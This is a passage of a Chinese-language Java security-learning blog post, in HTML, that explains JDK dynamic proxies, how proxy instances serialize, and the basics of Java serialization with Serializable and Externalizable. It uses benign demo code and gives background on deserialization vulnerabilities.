class="comment">//创建UnixFileSystem类实例</span></span><br><span class="line">        <span class="type">FileSystem</span> <span class="variable">fileSystem</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UnixFileSystem</span>();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//使用JDK动态代理生成FileSystem动态代理类实例</span></span><br><span class="line">        <span class="type">FileSystem</span> <span class="variable">proxyInstance</span> <span class="operator">=</span> (FileSystem) Proxy.newProxyInstance(</span><br><span class="line">                FileSystem.class.getClassLoader(),<span class="comment">// 指定动态代理类的类加载器</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;FileSystem.class&#125;, <span class="comment">// 定义动态代理生成的类实现的接口</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">JDKInvocationHandler</span>(fileSystem)<span class="comment">// 动态代理处理类，此时通过UnixFileSystem类代理FileSystem</span></span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;动态代理生成的类名:&quot;</span> + proxyInstance.getClass());</span><br><span class="line">        System.out.println(<span class="string">&quot;----------------------------------------------------------------------------------------&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;动态代理生成的实例名:&quot;</span> + proxyInstance);</span><br><span class="line">        System.out.println(<span class="string">&quot;----------------------------------------------------------------------------------------&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 使用动态代理的方式UnixFileSystem方法</span></span><br><span class="line">        String[] files = proxyInstance.list(<span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;.&quot;</span>));</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;----------------------------------------------------------------------------------------&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;UnixFileSystem.list方法执行结果:&quot;</span> + Arrays.toString(files));</span><br><span class="line">        System.out.println(<span class="string">&quot;----------------------------------------------------------------------------------------&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">boolean</span> <span class="variable">isFileSystem</span>     <span class="operator">=</span> proxyInstance <span class="keyword">instanceof</span> FileSystem;</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">isUnixFileSystem</span> <span class="operator">=</span> proxyInstance <span class="keyword">instanceof</span> UnixFileSystem;</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;动态代理类[&quot;</span> + proxyInstance.getClass() + <span class="string">&quot;]是否是FileSystem类的实例:&quot;</span> + isFileSystem);</span><br><span class="line">        System.out.println(<span class="string">&quot;----------------------------------------------------------------------------------------&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;动态代理类[&quot;</span> + proxyInstance.getClass() + <span class="string">&quot;]是否是UnixFileSystem类的实例:&quot;</span> + isUnixFileSystem);</span><br><span class="line">        System.out.println(<span class="string">&quot;----------------------------------------------------------------------------------------&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<img src="/image/image-20230714232550885.png" alt="image-20230714232550885" style="zoom:80%;" />

<p>我们来分析一下整个调用流程</p>
<ul>
<li>首先创建了一个UnixFileSystem类的实例，用以JDKInvocationHandler动态处理类代理</li>
<li>接着使用JDK动态代理生成FileSystem动态代理类实例，因此动态代理生成的类名和实例名分别是<code>class com.sun.proxy.$Proxy0</code>和<code>com.y5neko.sec.proxy.UnixFileSystem@29453f44</code></li>
<li>使用动态代理的方式执行<code>list</code>方法，实际上执行的是<code>UnixFileSystem</code>类的list方法，并且通过JDK动态代理的invoke方法覆写了<code>InvocationHandler</code>类的invoke方法，增加了前后和执行中的日志输出</li>
</ul>
<img src="/image/image-20230714235516874.png" alt="image-20230714235516874" style="zoom:80%;" />

<img src="/image/image-20230714235319076.png" alt="image-20230714235319076" style="zoom:80%;" />

<img src="/image/image-20230714235432821.png" alt="image-20230714235432821" style="zoom:80%;" />

<img src="/image/image-20230715000834139.png" alt="image-20230715000834139" style="zoom:80%;" />

<ul>
<li>接着判断动态代理类<code>com.sun.proxy.$Proxy0</code>属于哪个类的实例</li>
<li>注意此处结果，第一个为true，第二个为false，因为proxyInstance本身是FileSystem类，但是使用了UnixFileSystem类作为动态代理</li>
</ul>
<h3 id="动态代理类生成的-ProxyXXX类代码分析"><a href="#动态代理类生成的-ProxyXXX类代码分析" class="headerlink" title="动态代理类生成的$ProxyXXX类代码分析"></a>动态代理类生成的$ProxyXXX类代码分析</h3><p><code>java.lang.reflect.Proxy</code>类是通过创建一个新的<code>Java类(类名为com.sun.proxy.$ProxyXXX)</code>的方式来实现无侵入的类方法代理功能的。</p>
<p><strong>动态代理生成出来的类有如下技术细节和特性：</strong></p>
<ol>
<li>动态代理的必须是接口类，通过<code>动态生成一个接口实现类</code>来代理接口的方法调用(<code>反射机制</code>)。</li>
<li>动态代理类会由<code>java.lang.reflect.Proxy.ProxyClassFactory</code>创建。</li>
<li><code>ProxyClassFactory</code>会调用<code>sun.misc.ProxyGenerator</code>类生成该类的字节码，并调用<code>java.lang.reflect.Proxy.defineClass0()</code>方法将该类注册到<code>JVM</code>。</li>
<li>该类继承于<code>java.lang.reflect.Proxy</code>并实现了需要被代理的接口类，因为<code>java.lang.reflect.Proxy</code>类实现了<code>java.io.Serializable</code>接口，所以被代理的类支持<code>序列化/反序列化</code>。</li>
<li>该类实现了代理接口类(示例中的接口类是<code>com.y5neko.sec.proxy.FileSystem</code>)，会通过<code>ProxyGenerator</code>动态生成接口类(<code>FileSystem</code>)的所有方法，</li>
<li>该类因为实现了代理的接口类，所以当前类是代理的接口类的实例(<code>proxyInstance instanceof FileSystem</code>为<code>true</code>)，但不是代理接口类的实现类的实例(<code>proxyInstance instanceof UnixFileSystem</code>为<code>false</code>)。</li>
<li>该类方法中包含了被代理的接口类的所有方法，通过调用动态代理处理类(<code>InvocationHandler</code>)的<code>invoke</code>方法获取方法执行结果。</li>
<li>该类代理的方式重写了<code>java.lang.Object</code>类的<code>toString</code>、<code>hashCode</code>、<code>equals</code>方法。</li>
<li>如果动过动态代理生成了多个动态代理类，新生成的类名中的<code>0</code>会自增，如<code>com.sun.proxy.$Proxy0/$Proxy1/$Proxy2</code>。</li>
</ol>
<p><strong>动态代理生成的<code>com.sun.proxy.$Proxy0</code>类代码：</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.sun.proxy.$Proxy0;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.UndeclaredThrowableException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">$Proxy0</span> <span class="keyword">extends</span> <span class="title class_">Proxy</span> <span class="keyword">implements</span> <span class="title class_">FileSystem</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> Method m1;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 实现的FileSystem接口方法，如果FileSystem里面有多个方法那么在这个类中将从m3开始n个成员变量</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> Method m3;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> Method m0;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> Method m2;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> $Proxy0(InvocationHandler var1) &#123;</span><br><span class="line">        <span class="built_in">super</span>(var1);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> <span class="type">boolean</span> <span class="title function_">equals</span><span class="params">(Object var1)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> (Boolean) <span class="built_in">super</span>.h.invoke(<span class="built_in">this</span>, m1, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;var1&#125;);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (RuntimeException | Error var3) &#123;</span><br><span class="line">            <span class="keyword">throw</span> var3;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Throwable var4) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UndeclaredThrowableException</span>(var4);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> String[] list(File var1) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> (String[]) <span class="built_in">super</span>.h.invoke(<span class="built_in">this</span>, m3, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;var1&#125;);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (RuntimeException | Error var3) &#123;</span><br><span class="line">            <span class="keyword">throw</span> var3;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Throwable var4) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UndeclaredThrowableException</span>(var4);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> (Integer) <span class="built_in">super</span>.h.invoke(<span class="built_in">this</span>, m0, (Object[]) <span class="literal">null</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (RuntimeException | Error var2) &#123;</span><br><span class="line">            <span class="keyword">throw</span> var2;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Throwable var3) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UndeclaredThrowableException</span>(var3);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> (String) <span class="built_in">super</span>.h.invoke(<span class="built_in">this</span>, m2, (Object[]) <span class="literal">null</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (RuntimeException | Error var2) &#123;</span><br><span class="line">            <span class="keyword">throw</span> var2;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Throwable var3) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UndeclaredThrowableException</span>(var3);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            m1 = Class.forName(<span class="string">&quot;java.lang.Object&quot;</span>).getMethod(<span class="string">&quot;equals&quot;</span>, Class.forName(<span class="string">&quot;java.lang.Object&quot;</span>));</span><br><span class="line">            m3 = Class.forName(<span class="string">&quot;com.y5neko.sec.proxy.FileSystem&quot;</span>).getMethod(<span class="string">&quot;list&quot;</span>, Class.forName(<span class="string">&quot;java.io.File&quot;</span>));</span><br><span class="line">            m0 = Class.forName(<span class="string">&quot;java.lang.Object&quot;</span>).getMethod(<span class="string">&quot;hashCode&quot;</span>);</span><br><span class="line">            m2 = Class.forName(<span class="string">&quot;java.lang.Object&quot;</span>).getMethod(<span class="string">&quot;toString&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchMethodException var2) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NoSuchMethodError</span>(var2.getMessage());</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException var3) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NoClassDefFoundError</span>(var3.getMessage());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="动态代理类实例序列化问题"><a href="#动态代理类实例序列化问题" class="headerlink" title="动态代理类实例序列化问题"></a>动态代理类实例序列化问题</h3><p>动态代理类符合<code>Java</code>对象序列化条件，并且在<code>序列化/反序列化</code>时会被<code>ObjectInputStream/ObjectOutputStream</code>特殊处理。</p>
<h4 id="FileSystemProxySerializationTest"><a href="#FileSystemProxySerializationTest" class="headerlink" title="FileSystemProxySerializationTest"></a>FileSystemProxySerializationTest</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Copyright (c) 2023. Lorem ipsum dolor sit amet, consectetur adipiscing elit.</span></span><br><span class="line"><span class="comment"> * Morbi non lorem porttitor neque feugiat blandit. Ut vitae ipsum eget quam lacinia accumsan.</span></span><br><span class="line"><span class="comment"> * Etiam sed turpis ac ipsum condimentum fringilla. Maecenas magna.</span></span><br><span class="line"><span class="comment"> * Proin dapibus sapien vel ante. Aliquam erat volutpat. Pellentesque sagittis ligula eget metus.</span></span><br><span class="line"><span class="comment"> * Vestibulum commodo. Ut rhoncus gravida arcu.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> com.y5neko.sec.proxy;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FileSystemProxySerializationTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="comment">//创建UnixFileSystem类实例</span></span><br><span class="line">            <span class="type">FileSystem</span> <span class="variable">fileSystem</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UnixFileSystem</span>();</span><br><span class="line"></span><br><span class="line">            <span class="comment">//使用JDK动态代理生成FileSystem动态代理类实例</span></span><br><span class="line">            <span class="type">FileSystem</span> <span class="variable">proxyInstance</span> <span class="operator">=</span> (FileSystem) Proxy.newProxyInstance(</span><br><span class="line">                    FileSystem.class.getClassLoader(),<span class="comment">// 指定动态代理类的类</span></span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;FileSystem.class&#125;,<span class="comment">//指定动态代理实现的接口</span></span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">JDKInvocationHandler</span>(fileSystem)<span class="comment">//使用JDK动态处理类，用UnixFileSystem类代理</span></span><br><span class="line">            );</span><br><span class="line"></span><br><span class="line">            <span class="comment">//创建Java字节输出流对象</span></span><br><span class="line">            <span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line"></span><br><span class="line">            <span class="comment">//创建Java反序列化输出流对象</span></span><br><span class="line">            <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(baos);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//序列化动态代理类</span></span><br><span class="line">            oos.writeObject(proxyInstance);</span><br><span class="line">            oos.flush();</span><br><span class="line">            oos.close();</span><br><span class="line"></span><br><span class="line">            System.out.println(<span class="string">&quot;序列化结果为：&quot;</span>);</span><br><span class="line">            System.out.println(baos);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 利用动态代理类生成的二进制数组创建二进制输入流对象用于反序列化操作</span></span><br><span class="line">            <span class="type">ByteArrayInputStream</span> <span class="variable">bais</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(baos.toByteArray());</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 通过反序列化输入流(bais),创建Java对象输入流(ObjectInputStream)对象</span></span><br><span class="line">            <span class="type">ObjectInputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(bais);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 反序列化输入流数据为FileSystem对象</span></span><br><span class="line">            <span class="type">FileSystem</span> <span class="variable">test</span> <span class="operator">=</span> (FileSystem) in.readObject();</span><br><span class="line"></span><br><span class="line">            System.out.println(<span class="string">&quot;反序列化类实例类名:&quot;</span> + test.getClass());</span><br><span class="line">            System.out.println(<span class="string">&quot;反序列化类实例:&quot;</span> + test);</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<img src="/image/image-20230717191420750.png" alt="image-20230717191420750" style="zoom:80%;" />

<p>动态代理生成的类在<code>反序列化/反序列化</code>时不会序列化该类的成员变量，并且<code>serialVersionUID</code>为<code>0L</code> ，也将是说将该类的<code>Class</code>对象传递给<code>java.io.ObjectStreamClass</code>的静态<code>lookup</code>方法时，返回的<code>ObjectStreamClass</code>实例将具有以下特性：</p>
<ol>
<li>调用其<code>getSerialVersionUID</code>方法将返回<code>0L</code> 。</li>
<li>调用其<code>getFields</code>方法将返回长度为零的数组。</li>
<li>调用其<code>getField</code>方法将返回<code>null</code> 。</li>
</ol>
<p>但其父类(<code>java.lang.reflect.Proxy</code>)在序列化时不受影响，父类中的<code>h</code>变量(<code>InvocationHandler</code>)将会被序列化，这个<code>h</code>存储了动态代理类的处理类实例以及动态代理的接口类的实现类的实例。</p>
<p>动态代理生成的对象(<code>com.sun.proxy.$ProxyXXX</code>)序列化的时候会使用一个特殊的协议：<code>TC_PROXYCLASSDESC(0x7D)</code>，这个常量在<code>java.io.ObjectStreamConstants</code>中定义的。在反序列化时也不会调用<code>java.io.ObjectInputStream</code>类的<code>resolveClass</code>方法而是调用<code>resolveProxyClass</code>方法来转换成类对象的。</p>
<h2 id="Java类序列化"><a href="#Java类序列化" class="headerlink" title="Java类序列化"></a>Java类序列化</h2><p>在很多语言中都提供了对象反序列化支持，Java在JDK1.1(<code>1997年</code>)时就内置了对象反序列化(<code>java.io.ObjectInputStream</code>)支持。Java对象序列化指的是<code>将一个Java类实例序列化成字节数组</code>，用于存储对象实例化信息：类成员变量和属性值。 Java反序列化可以<code>将序列化后的二进制数组转换为对应的Java类实例</code>。</p>
<p>Java序列化对象因其可以方便的将对象转换成字节数组，又可以方便快速的将字节数组反序列化成Java对象而被非常频繁的被用于<code>Socket</code>传输。 在<code>RMI(Java远程方法调用-Java Remote Method Invocation)</code>和<code>JMX(Java管理扩展-Java Management Extensions)</code>服务中对象反序列化机制被强制性使用。在Http请求中也时常会被用到反序列化机制，如：直接接收序列化请求的后端服务、使用Base编码序列化字节字符串的方式传递等。</p>
<h3 id="Java反序列化漏洞"><a href="#Java反序列化漏洞" class="headerlink" title="Java反序列化漏洞"></a>Java反序列化漏洞</h3><p>自从2015年<a href="https://issues.apache.org/jira/browse/COLLECTIONS-580">Apache Commons Collections反序列化漏洞</a>(<a href="https://github.com/frohoff/ysoserial">ysoserial</a>的最早的commit记录是2015年1月29日,说明这个漏洞可能早在2014年甚至更早就已经被人所利用)利用方式被人公开后直接引发了Java生态系统的大地震，与此同时Java反序列化漏洞仿佛掀起了燎原之势，无数的使用了反序列化机制的Java应用系统惨遭黑客疯狂的攻击，为企业安全甚至是国家安全带来了沉重的打击！</p>
<p>直至今日(2019年12月)已经燃烧了Java平台四年之久的反序列化漏洞之火还仍未熄灭。如今的反序列化机制在Java中几乎成为了致命的存在，反序列化漏洞带来的巨大危害也逐渐被我们熟知。2018年1月Oracle安全更新了237个漏洞，而反序列化漏洞就占了28.5%，由此可见Oracle对反序列化机制的深恶痛绝。2012年<code>JEP 154</code>提出了移除反序列化机制：<a href="https://openjdk.java.net/jeps/154">JEP 154: Remove Serialization</a>、<a href="https://bugs.openjdk.java.net/browse/JDK-8046144">JDK-8046144</a>，但似乎并未通过，移除反序列化是一个持久性的工作，短期内我们还是需要靠自身去解决反序列化机制带来的安全问题。</p>
<h3 id="Java-序列化-反序列化"><a href="#Java-序列化-反序列化" class="headerlink" title="Java 序列化&#x2F;反序列化"></a>Java 序列化&#x2F;反序列化</h3><p>在Java中实现对象反序列化非常简单，实现<code>java.io.Serializable(内部序列化)</code>或<code>java.io.Externalizable(外部序列化)</code>接口即可被序列化，其中<code>java.io.Externalizable</code>接口只是实现了<code>java.io.Serializable</code>接口。</p>
<p>反序列化类对象时有如下限制：</p>
<ol>
<li>被反序列化的类必须存在。</li>
<li><code>serialVersionUID</code>值必须一致。</li>
</ol>
<p>除此之外，<strong>反序列化类对象是不会调用该类构造方法</strong>的，因为在反序列化创建类实例时使用了<code>sun.reflect.ReflectionFactory.newConstructorForSerialization</code>创建了一个反序列化专用的<code>Constructor(反射构造方法对象)</code>，使用这个特殊的<code>Constructor</code>可以绕过构造方法创建类实例(前面章节讲<code>sun.misc.Unsafe</code> 的时候我们提到了使用<code>allocateInstance</code>方法也可以实现绕过构造方法创建类实例)。</p>
<h4 id="ObjectInputStream、ObjectOutputStream"><a href="#ObjectInputStream、ObjectOutputStream" class="headerlink" title="ObjectInputStream、ObjectOutputStream"></a>ObjectInputStream、ObjectOutputStream</h4><p><code>java.io.ObjectOutputStream</code>类最核心的方法是<code>writeObject</code>方法，即序列化类对象。</p>
<p><code>java.io.ObjectInputStream</code>类最核心的功能是<code>readObject</code>方法，即反序列化类对象。</p>
<p>所以，只需借助<code>ObjectInputStream</code>和<code>ObjectOutputStream</code>类我们就可以实现类的序列化和反序列化功能了。</p>
<h4 id="java-io-Serializable-内部序列化"><a href="#java-io-Serializable-内部序列化" class="headerlink" title="java.io.Serializable(内部序列化)"></a>java.io.Serializable(内部序列化)</h4><p><code>java.io.Serializable</code>是一个空的接口,我们不需要实现<code>java.io.Serializable</code>的任何方法，代码如下:</p>
<img src="/image/image-20230717214118285.png" alt="image-20230717214118285" style="zoom:80%;" />

<p>您可能会好奇我们实现一个空接口有什么意义？其实实现<code>java.io.Serializable</code>接口仅仅只用于<code>标识这个类可序列化</code>。实现了<code>java.io.Serializable</code>接口的类原则上都需要生产一个<code>serialVersionUID</code>常量，反序列化时如果双方的<code>serialVersionUID</code>不一致会导致<code>InvalidClassException</code> 异常。如果可序列化类未显式声明 <code>serialVersionUID</code>，则序列化运行时将基于该类的各个方面计算该类的默认 <code>serialVersionUID</code>值。</p>
<h5 id="DeserializationTest-java"><a href="#DeserializationTest-java" class="headerlink" title="DeserializationTest.java"></a>DeserializationTest.java</h5><p>核心逻辑其实就是使用<code>ObjectOutputStream</code>类的<code>writeObject</code>方法序列化<code>DeserializationTest</code>类，使用<code>ObjectInputStream</code>类的<code>readObject</code>方法反序列化<code>DeserializationTest</code>类</p>
<p>简化后的代码片段如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 序列化DeserializationTest类</span></span><br><span class="line"><span class="type">ObjectOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(baos);</span><br><span class="line">out.writeObject(t);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 反序列化输入流数据为DeserializationTest对象</span></span><br><span class="line"><span class="type">ObjectInputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(bais);</span><br><span class="line"><span class="type">DeserializationTest</span> <span class="variable">test</span> <span class="operator">=</span> (DeserializationTest) in.readObject();</span><br></pre></td></tr></table></figure>



<h4 id="使用反序列化方式创建类实例"><a href="#使用反序列化方式创建类实例" class="headerlink" title="使用反序列化方式创建类实例"></a>使用反序列化方式创建类实例</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Copyright (c) 2023. Lorem ipsum dolor sit amet, consectetur adipiscing elit.</span></span><br><span class="line"><span class="comment"> * Morbi non lorem porttitor neque feugiat blandit. Ut vitae ipsum eget quam lacinia accumsan.</span></span><br><span class="line"><span class="comment"> * Etiam sed turpis ac ipsum condimentum fringilla. Maecenas magna.</span></span><br><span class="line"><span class="comment"> * Proin dapibus sapien vel ante. Aliquam erat volutpat. Pellentesque sagittis ligula eget metus.</span></span><br><span class="line"><span class="comment"> * Vestibulum commodo. Ut rhoncus gravida arcu.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> com.y5neko.sec.serialize;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sun.reflect.ReflectionFactory;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ReflectionFactoryTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="comment">//获取sun.reflect.ReflectionFactory对象</span></span><br><span class="line">            <span class="type">ReflectionFactory</span> <span class="variable">reflectionFactory</span> <span class="operator">=</span> ReflectionFactory.getReflectionFactory();</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 使用反序列化方式获取DeserializationTest类的构造方法</span></span><br><span class="line">            <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> reflectionFactory.newConstructorForSerialization(DeserializationTest.class, Object.class.getConstructor());</span><br><span class="line">            System.out.println(constructor.newInstance());</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<img src="/image/image-20230717224232836.png" alt="image-20230717224232836" style="zoom:80%;" />

<h4 id="java-io-Externalizable-外部序列化"><a href="#java-io-Externalizable-外部序列化" class="headerlink" title="java.io.Externalizable(外部序列化)"></a>java.io.Externalizable(外部序列化)</h4><p><code>java.io.Externalizable</code>和<code>java.io.Serializable</code>几乎一样，只是<code>java.io.Externalizable</code>接口定义了<code>writeExternal</code>和<code>readExternal</code>方法需要序列化和反序列化的类实现，其余的和<code>java.io.Serializable</code>并无差别。</p>
<img src="/image/image-20230717224556096.png" alt="image-20230717224556096" style="zoom:80%;" />

<h5 id="ExternalizableTest-java"><a href="#ExternalizableTest-java" class="headerlink" title="ExternalizableTest.java"></a>ExternalizableTest.java</h5><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Copyright (c) 2023. Lorem ipsum dolor sit amet, consectetur adipiscing elit.</span></span><br><span class="line"><span class="comment"> * Morbi non lorem porttitor neque feugiat blandit. Ut vitae ipsum eget quam lacinia accumsan.</span></span><br><span class="line"><span class="comment"> * Etiam sed turpis ac ipsum condimentum fringilla. Maecenas magna.</span></span><br><span class="line"><span class="comment"> * Proin dapibus sapien vel ante. Aliquam erat volutpat. Pellentesque sagittis ligula eget metus.</span></span><br><span class="line"><span class="comment"> * Vestibulum commodo. Ut rhoncus gravida arcu.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> com.y5neko.sec.serialize;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ExternalizableTest</span> <span class="keyword">implements</span> <span class="title class_">java</span>.io.Externalizable&#123;</span><br><span class="line">    <span class="keyword">private</span> String username;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String email;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setUsername</span><span class="params">(String username)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.username = username;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setEmail</span><span class="params">(String email)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.email = email;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getUsername</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">// make the client log the Object</span></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.username;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getEmail</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.email;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    实现了writeExternal和readExternal方法</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">writeExternal</span><span class="params">(ObjectOutput oot)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        oot.writeObject(username);</span><br><span class="line">        oot.writeObject(email);</span><br><span class="line">    &#125;</span><br><span class="line">    <span 